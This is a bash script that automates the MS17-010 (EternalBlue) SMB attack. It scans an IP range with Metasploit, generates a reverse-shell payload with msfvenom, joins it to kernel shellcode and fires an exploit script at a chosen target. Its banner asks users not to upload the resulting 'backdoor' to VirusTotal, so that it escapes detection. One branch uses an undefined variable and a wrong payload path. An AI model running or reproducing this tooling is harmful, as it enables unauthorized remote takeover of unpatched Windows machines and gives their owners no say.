#!/bin/bash
#color code?
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[0;33m'
BlueF='\e[1;34m' #Biru
RESET="\033[00m" #normal
orange='\e[38;5;166m'
file="dependencies/config.path"
msfconsole=`sed -n 1p $file`
msfvenom=`sed -n 2p $file`
python=`sed -n 3p $file`
rm -r scanner payload.bin payload.f.bin 
clear
echo -e $red""
echo "=================================================================="
echo "         WARNING !  WARNING ! WARNING ! WARNING ! WARNING ! "
echo "    YOU CAN UPLOAD OUTPUT/BACKDOOR FILE TO WWW.NODISTRIBUTE.COM   "
echo "=================================================================="
echo " ____  _____ _____ _____    _____ _____ __    _____ _____ ____    ";
echo "|    \|     |   | |_   _|  |  |  |  _  |  |  |     |  _  |    \   ";
echo "|  |  |  |  | | | | | |    |  |  |   __|  |__|  |  |     |  |  |  ";
echo "|____/|_____|_|___| |_|    |_____|__|  |_____|_____|__|__|____/   ";
echo "                         _____ _____                              ";
echo "                        |_   _|     |                             ";
echo "                          | | |  |  |                             ";
echo "                          |_| |_____|                             ";
echo " _____ _____ _____ _____ _____    _____ _____ _____ _____ __      ";
echo "|  |  |     | __  |  |  |   __|  |_   _|     |_   _|  _  |  |     ";
echo "|  |  |-   -|    -|  |  |__   |    | | |  |  | | | |     |  |__   ";
echo " \___/|_____|__|__|_____|_____|    |_| |_____| |_| |__|__|_____|  ";
echo "=================================================================="
echo "       PLEASE DON'T UPLOAD BACKDOOR TO WWW.VIRUSTOTAL.COM "
echo "    YOU CAN UPLOAD OUTPUT/BACKDOOR FILE TO WWW.NODISTRIBUTE.COM   "
echo "=================================================================="
echo ""
echo -n "Press [Enter] key to continue .............."
read warning
clear
echo 
echo -e $okegreen " Author of exploit worawit https://github.com/worawit"
echo 
echo -e $cyan " Design style by Screetsec https://github.com/Screetsec"
echo
echo -e $yellow " Scanner by topranks  https://github.com/topranks/MS17-010_SUBNET"
echo
echo -e "  assembled by missyes"
sleep 3
clear
echo -ne $okegreen " Scan network ? (Y/n)"
read answer
case $answer in 
n|no|No|NO)
echo -e $red " PLEASE BE ATTENTIVELY IN CHOICE PAYLOAD (ex.:windows/x64/shell/reverse_tcp)"
echo -ne $okegreen "  Set payload to use : "
read payload
echo -ne $okegreen "  Set your ip : "
read localip
echo -ne $okegreen "  Set your port : "
read localport
echo -ne $okegreen "  Set target ip : "
read targetip
echo -ne $okegreen "  Set target architecture (x64/x86) : "
read targetarch
echo -ne $orange " Set an exploit to be used (exploit7(8).py) : "
read exploitvers
msfvenom -p tmp/$payload -f raw -o $pldname.bin EXITFUNC=thread LHOST=$localip LPORT=$localport
cat scripts/shellcode_$targetarch $pldname.bin > $pldname.f.bin
echo -e $red      " Is a listener ready ? "
read 
python scripts/$exploitvers $targetip $pldname.f.bin 12
sleep 4
read 
exit 0
;;
*)
echo -ne $okegreen "  Set a range of ip (example:192.168.0.100-110) : "
read targetip
echo "use auxiliary/scanner/smb/smb_ms17_010" > scanner
echo "set RHOSTS $targetip" >> scanner
echo "set THREADS 12" >> scanner
echo "run" >> scanner
gnome-terminal -e 'msfconsole -r scanner'
sleep 2
clear
echo -e $okegreen " Push [ENTER] to continue"
echo -e $red " PLEASE BE ATTENTIVELY IN CHOICE PAYLOAD (ex.:windows/x64/shell/reverse_tcp)"
echo -ne $okegreen "  Set payload to use : "
read payload
echo -ne $okegreen "  Set your ip : "
read localip
echo -ne $okegreen "  Set your port : "
read localport
echo -ne $okegreen "  Set target ip : "
read targetip
echo -ne $okegreen "  Set target architecture (x64/x86) : "
read targetarch
echo -ne $orange " Set an exploit to be used (exploit7(8).py) : "
read exploitvers
msfvenom -p $payload -f raw -o payload.bin EXITFUNC=thread LHOST=$localip LPORT=$localport
sleep 3
cat scripts/shellcode_$targetarch payload.bin > payload.f.bin
echo -e $red     " Is a listener ready ? "
read 
sleep 1
python scripts/$exploitvers $targetip payload.f.bin 12
sleep 4
read
;;
esac
echo -e $orange" If you would like to use the same exploit again, run the following code in dirictory with payload.f.bin "
echo -e $yellow " python exploit7(8).py target_ip payload.g.bin 12_or_17"
exit 0



